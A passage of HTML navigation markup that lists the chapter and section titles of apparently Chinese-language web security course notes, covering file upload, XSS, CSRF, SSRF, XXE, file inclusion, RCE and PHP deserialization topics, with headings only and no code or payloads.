class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E5%88%A4%E6%96%AD%EF%BC%9A-%E2%80%94%E2%80%94%E8%BE%83%E9%9A%BE"><span class="nav-number">31.0.0.5.</span> <span class="nav-text">二次渲染判断：        ——较难</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-11"><span class="nav-number">31.0.0.6.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC33%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E8%E4%BC%BC%E7%BC%96%E5%99%A8%E5%AE%89%E5%85%A8"><span class="nav-number">32.</span> <span class="nav-text">第33天 WEB攻防-通用漏洞&amp;文件上传&amp;中间件解析漏洞8似编器安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-16"><span class="nav-number">32.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-5"><span class="nav-number">32.0.0.2.</span> <span class="nav-text">#详细点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E7%AB%A0%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9%EF%BC%9A-2"><span class="nav-number">32.0.0.3.</span> <span class="nav-text">#本章课程内容：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-12"><span class="nav-number">32.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Apache%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="nav-number">32.0.0.5.</span> <span class="nav-text">#Apache换行解析配置不当</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Nginx-%E6%96%87%E4%BB%B6%E5%90%8D%E9%80%BB%E8%BE%91%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">32.0.0.6.</span> <span class="nav-text">#Nginx 文件名逻辑解析漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web%E5%BA%94%E7%94%A8%E7%BC%96%E8%BE%91%E5%99%A8-Ueditor%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AE%89%E5%85%A8"><span class="nav-number">32.0.0.7.</span> <span class="nav-text">#Web应用编辑器-Ueditor文件上传安全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8BCMS-%E5%B9%B3%E5%8F%B0-%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90-%E7%BC%96%E8%BE%91%E5%99%A8%E5%BC%95%E7%94%A8"><span class="nav-number">32.0.0.8.</span> <span class="nav-text">#实例CMS&amp;平台-中间件解析&amp;编辑器引用</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC34%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E5%90%8C8-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A08%E9%BB%91%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A18%E9%80%BB%E6%8D%90-%E4%B8%AD%E9%97%B4%E4%BB%B6-%E5%A4%96%E9%83%A8%E5%BC%95%E7%94%A8"><span class="nav-number">33.</span> <span class="nav-text">第34天 WEB攻防-通用漏同8&amp;文件上传8黑白盒审计8逻捐&amp;中间件&amp;外部引用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-17"><span class="nav-number">33.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-6"><span class="nav-number">33.0.0.2.</span> <span class="nav-text">#详细点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E7%AB%A0%E8%AF%BE%E7%A8%8B%E5%86%85%E5%AE%B9%EF%BC%9A-3"><span class="nav-number">33.0.0.3.</span> <span class="nav-text">#本章课程内容：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B-1"><span class="nav-number">33.0.0.4.</span> <span class="nav-text">演示案例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1-Finecms-%E4%BB%A3%E7%A0%81%E5%B8%B8%E8%A7%84-%E5%A4%84%E7%90%86%E9%80%BB%E8%BE%91"><span class="nav-number">33.0.0.5.</span> <span class="nav-text">#白盒审计-Finecms-代码常规-处理逻辑</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1-CuppaCms-%E4%B8%AD%E9%97%B4%E4%BB%B6-htaccess"><span class="nav-number">33.0.0.6.</span> <span class="nav-text">#白盒审计-CuppaCms-中间件-.htaccess</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1-Metinfo-%E7%BC%96%E8%BE%91%E5%99%A8%E5%BC%95%E7%94%A8-%E7%AC%AC%E4%B8%89%E6%96%B9%E5%AE%89%E5%85%A8"><span class="nav-number">33.0.0.7.</span> <span class="nav-text">#白盒审计-Metinfo-编辑器引用-第三方安全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9A"><span class="nav-number">33.0.0.8.</span> <span class="nav-text">#文件上传：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC35%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99-%E5%8F%8D%E5%B0%84-%E5%AD%98%E5%82%A8-DOM-%E7%9B%B2%E6%89%93-%E5%8A%AB%E6%8C%81"><span class="nav-number">34.</span> <span class="nav-text">第35天 WEB攻防-通用漏洞&amp;XSS跨站&amp;反射&amp;存储&amp;DOM&amp;盲打&amp;劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-18"><span class="nav-number">34.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS%E8%B7%A8%E7%AB%99%E7%B3%BB%E5%88%97%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="nav-number">34.0.0.2.</span> <span class="nav-text">#XSS跨站系列内容：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-13"><span class="nav-number">34.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC36%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99-MXSS-UXSS-FlashXSS-PDFXSS"><span class="nav-number">35.</span> <span class="nav-text">第36天 WEB攻防-通用漏洞&amp;XSS跨站&amp;MXSS&amp;UXSS&amp;FlashXSS&amp;PDFXSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-19"><span class="nav-number">35.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-14"><span class="nav-number">35.0.0.2.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MXSS-https-www-fooying-com-the-art-of-xss-1-introduction"><span class="nav-number">35.0.0.3.</span> <span class="nav-text">#MXSS:https:&#x2F;&#x2F;www.fooying.com&#x2F;the-art-of-xss-1-introduction&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#UXsS%E5%85%A8%E7%A7%B0Jniversal-Cross-Site-Scripting"><span class="nav-number">35.0.0.4.</span> <span class="nav-text">#UXsS全称Jniversal Cross-.Site Scripting</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Flashxss-swf%E5%BC%95%E7%94%A8js%E7%9A%84xss"><span class="nav-number">35.0.0.5.</span> <span class="nav-text">#Flashxss-swf引用js的xss</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PDFXSS-%E4%B8%8A%E4%BC%A0%E5%90%8E%E7%9B%B4%E9%93%BE%E5%8F%91"><span class="nav-number">35.0.0.6.</span> <span class="nav-text">#PDFXSS-上传后直链发</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC37%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%92%93%E9%B1%BC%E6%8D%86%E7%BB%91-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">36.</span> <span class="nav-text">第37天 WEB攻防-通用漏洞&amp;XSS跨站&amp;权限维持&amp;钓鱼捆绑&amp;浏览器漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="nav-number">36.0.0.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-15"><span class="nav-number">36.0.0.2.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS-%E5%90%8E%E5%8F%B0%E6%A4%8D%E5%85%A5Cookie-%E8%A1%A8%E5%8D%95%E5%8A%AB%E6%8C%81"><span class="nav-number">36.0.0.3.</span> <span class="nav-text">#XSS-后台植入Cookie&amp;表单劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS-Flash%E9%92%93%E9%B1%BC%E9%85%8D%E5%90%88MSF%E6%8D%86%E7%BB%91%E4%B8%8A%E7%BA%BF"><span class="nav-number">36.0.0.4.</span> <span class="nav-text">#XSS-Flash钓鱼配合MSF捆绑上线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS-%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BD%91%E9%A9%AC%E9%85%8D%E5%90%88MSF%E8%AE%BF%E9%97%AE%E4%B8%8A%E7%BA%BF"><span class="nav-number">36.0.0.5.</span> <span class="nav-text">#XSS-浏览器网马配合MSF访问上线</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC38%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-XSS%E8%B7%A8%E7%AB%99-%E7%BB%95%E8%BF%87%E4%BF%AE%E5%A4%8D-http-only-CSP-%E6%A0%87%E7%AD%BE%E7%AC%A6%E5%8F%B7"><span class="nav-number">37.</span> <span class="nav-text">第38天 WEB攻防-通用漏洞&amp;XSS跨站&amp;绕过修复&amp;http-only&amp;CSP&amp;标签符号</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-3"><span class="nav-number">37.0.0.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-16"><span class="nav-number">37.0.0.2.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS%E4%BF%AE%E5%A4%8D-%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0-http-only-CSP-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="nav-number">37.0.0.3.</span> <span class="nav-text">#XSS修复-过滤函数&amp;http_only&amp;CSP&amp;长度限制</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC40%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E5%8D%8F%E8%AE%AE%E7%8E%A9%E6%B3%95-%E5%86%85%E7%BD%91%E6%8E%A2%E9%92%88-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">38.</span> <span class="nav-text">第40天 WEB攻防-通用漏洞&amp;CSRF&amp;SSRF&amp;协议玩法&amp;内网探针&amp;漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-20"><span class="nav-number">38.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-7"><span class="nav-number">38.0.0.2.</span> <span class="nav-text">#详细点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E5%88%97%E5%86%85%E5%AE%B9%E7%82%B9%EF%BC%9A"><span class="nav-number">38.0.0.3.</span> <span class="nav-text">#系列内容点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSRF-%E5%8E%9F%E7%90%86-%E5%90%8E%E5%8F%B0%E8%87%AA%E5%8A%A8%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-number">38.0.0.4.</span> <span class="nav-text">#CSRF-原理&amp;后台自动添加管理员</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF-%E5%8E%9F%E7%90%86-%E6%9C%8D%E5%8A%A1-%E5%8D%8F%E8%AE%AE-%E5%86%85%E7%BD%91-%E6%BC%8F%E6%B4%9E"><span class="nav-number">38.0.0.5.</span> <span class="nav-text">#SSRF-原理&amp;服务&amp;协议&amp;内网&amp;漏洞</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC40%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CSRF-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5-%E5%8A%A0%E8%BD%BD%E5%87%BD%E6%95%B0"><span class="nav-number">39.</span> <span class="nav-text">第40天 WEB攻防-通用漏洞&amp;CSRF&amp;SSRF&amp;代码审计&amp;同源策略&amp;加载函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-4"><span class="nav-number">39.0.0.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-17"><span class="nav-number">39.0.0.2.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SSRF"><span class="nav-number">39.0.0.3.</span> <span class="nav-text">SSRF:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9%E6%80%A7%E6%8C%96%E6%8E%98%E5%AE%A1%E8%AE%A1"><span class="nav-number">39.0.0.4.</span> <span class="nav-text">特性挖掘审计</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="nav-number">39.0.0.5.</span> <span class="nav-text">其他漏洞：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC41%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-XML-XXE-%E6%97%A0%E5%9B%9E%E6%98%BE-DTD%E5%AE%9E%E4%BD%93-%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">40.</span> <span class="nav-text">第41天 WEB攻防-通用漏洞&amp;XML&amp;XXE&amp;无回显&amp;DTD实体&amp;伪协议&amp;代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-21"><span class="nav-number">40.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E7%82%B9%EF%BC%9A"><span class="nav-number">40.0.0.2.</span> <span class="nav-text">#思路点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XXE%E4%BF%AE%E5%A4%8D%E9%98%B2%E5%8D%B8%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="nav-number">40.0.0.3.</span> <span class="nav-text">XXE修复防卸方案：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-18"><span class="nav-number">40.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XML-XXE%E9%BB%91%E7%9B%92-%E5%8E%9F%E7%90%86-%E6%8E%A2%E9%92%88-%E5%88%A9%E7%94%A8-%E7%8E%A9%E6%B3%95%E7%AD%89"><span class="nav-number">40.0.0.5.</span> <span class="nav-text">#XML&amp;XXE黑盒-原理&amp;探针&amp;利用&amp;玩法等</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XML-XXE-%E5%89%8D%E7%AB%AF-CTF-Jarvisoj-%E6%8E%A2%E9%92%88-%E5%88%A9%E7%94%A8"><span class="nav-number">40.0.0.6.</span> <span class="nav-text">#XML&amp;XXE-前端-CTF&amp;Jarvisoj&amp;探针&amp;利用</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC42%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">41.</span> <span class="nav-text">第42天：WEB攻防-通用漏洞&amp;文件包含&amp;LFI&amp;RFI&amp;伪协议编码算法&amp;代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-22"><span class="nav-number">41.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="nav-number">41.0.0.2.</span> <span class="nav-text">#核心知识：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E8%A6%81%E7%82%B9%EF%BC%9A"><span class="nav-number">41.0.0.3.</span> <span class="nav-text">#思路要点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E8%AF%BE%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="nav-number">41.0.0.4.</span> <span class="nav-text">#本课总结：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-19"><span class="nav-number">41.0.0.5.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-%E5%8E%9F%E7%90%86-%E5%88%86%E7%B1%BB-%E6%8E%A2%E9%92%88-%E5%88%A9%E7%94%A8-%E4%BF%AE%E5%A4%8D"><span class="nav-number">41.0.0.6.</span> <span class="nav-text">#前置知识-原理&amp;分类&amp;探针&amp;利用&amp;修复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CTF%E5%BA%94%E7%94%A8-CTFSHOW-78%E5%85%B3%E5%8D%A1%E5%88%B0117%E5%85%B3%E5%8D%A1"><span class="nav-number">41.0.0.7.</span> <span class="nav-text">#CTF应用-CTFSHOW-78关卡到117关卡</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#78-php-http%E5%8D%8F%E8%AE%AE"><span class="nav-number">41.0.0.7.0.1.</span> <span class="nav-text">78-php&amp;http协议</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#79-data-http%E5%8D%8F%E8%AE%AE"><span class="nav-number">41.0.0.7.0.2.</span> <span class="nav-text">79-data&amp;http协议</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#80-81-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="nav-number">41.0.0.7.0.3.</span> <span class="nav-text">80 81-日志包含</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#81%E5%85%B3-%E5%A2%9E%E5%8A%A0%E8%BF%87%E6%BB%A4%E4%BA%86-%E4%BB%8D%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E7%BB%95%E8%BF%87"><span class="nav-number">41.0.0.7.0.4.</span> <span class="nav-text">81关 增加过滤了 : 仍可以使用日志文件绕过</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#82-86-SESSION%E5%8C%85%E5%90%AB"><span class="nav-number">41.0.0.7.0.5.</span> <span class="nav-text">82-86-SESSION包含</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#87-php-filter-write-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81"><span class="nav-number">41.0.0.7.0.6.</span> <span class="nav-text">87-php:&#x2F;filter&#x2F;write&amp;加密编码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#88-data-base64%E5%8D%8F%E8%AE%AE"><span class="nav-number">41.0.0.7.0.7.</span> <span class="nav-text">88-data&amp;base64协议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CMS%E6%BA%90%E7%A0%81-XHCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%97%A5%E5%BF%97-%E7%BB%95%E8%BF%87"><span class="nav-number">41.0.0.8.</span> <span class="nav-text">#CMS源码-XHCMS-代码审计&amp;日志&amp;绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E8%AF%BE%E6%80%BB%E7%BB%93%EF%BC%9A-1"><span class="nav-number">41.0.0.9.</span> <span class="nav-text">#本课总结：</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC43%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E5%88%A0%E9%99%A4%E9%87%8D%E8%A3%85-%E6%95%8F%E6%84%9F%E8%AF%BB%E5%8F%96-%E9%BB%91%E7%99%BD%E5%AE%A1%E8%AE%A1"><span class="nav-number">42.</span> <span class="nav-text">第43天：WEB攻防-通用漏洞&amp;任意文件下载&amp;删除重装&amp;敏感读取&amp;黑白审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-23"><span class="nav-number">42.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-8"><span class="nav-number">42.0.0.2.</span> <span class="nav-text">#详细点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-20"><span class="nav-number">42.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%EF%BC%9A"><span class="nav-number">42.0.0.4.</span> <span class="nav-text">#白盒审计：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E7%9B%92%E6%8E%A2%E9%92%88"><span class="nav-number">42.0.0.5.</span> <span class="nav-text">#黑盒探针</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC44%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-RCE-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%A4%9A%E5%B1%82%E9%9D%A2%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8"><span class="nav-number">43.</span> <span class="nav-text">第44天：WEB攻防-通用漏洞&amp;RCE&amp;代码执行&amp;命令执行&amp;多层面检测利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-24"><span class="nav-number">43.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-9"><span class="nav-number">43.0.0.2.</span> <span class="nav-text">#详细点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-21"><span class="nav-number">43.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RCE-%E5%8E%9F%E7%90%86-%E6%8E%A2%E9%92%88-%E5%88%A9%E7%94%A8-%E5%8D%B1%E5%AE%B3%E7%AD%89"><span class="nav-number">43.0.0.4.</span> <span class="nav-text">#RCE-原理&amp;探针&amp;利用&amp;危害等</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PbootCMS-RCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">43.0.0.5.</span> <span class="nav-text">#代码审计-PbootCMS-RCE代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%82%E9%9D%A2-%E6%8E%A2%E9%92%88-%E8%AF%AD%E8%A8%80-CMS%E6%A1%86%E6%9E%B6-%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="nav-number">43.0.0.6.</span> <span class="nav-text">#层面-探针-语言&amp;CMS框架&amp;中间件</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC45%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="nav-number">44.</span> <span class="nav-text">第45天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-25"><span class="nav-number">44.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%BE%E7%A8%8B%E7%82%B9%EF%BC%9A"><span class="nav-number">44.0.0.2.</span> <span class="nav-text">#反序列化课程点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">44.0.0.3.</span> <span 